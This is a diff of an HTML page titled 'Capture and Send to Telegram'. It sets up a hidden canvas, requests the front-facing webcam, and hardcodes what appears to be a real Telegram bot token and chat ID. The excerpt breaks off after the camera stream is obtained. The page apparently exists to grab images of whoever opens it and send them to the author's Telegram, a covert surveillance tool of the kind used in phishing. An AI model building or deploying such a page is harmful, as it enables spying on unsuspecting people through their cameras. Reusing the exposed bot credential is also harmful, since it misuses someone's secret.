@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Capture and Send to Telegram</title>
 </head>
 <body>
@@ -10,8 +10,8 @@
   <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
   <script>
-    const BOT_TOKEN = '8268065223:AAHj509vUGIJDuQDxuMSB73t6__-FFb6ug4';         // ← استبدل بتوكين البوت
-    const CHAT_ID = '5606349322';             // ← استبدل برقم المحادثة (chat_id)
+    const BOT_TOKEN = '8268065223:AAHj509vUGIJDuQDxuMSB73t6__-FFb6ug4';
+    const CHAT_ID = '5606349322';
 
     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
       .then(stream => {
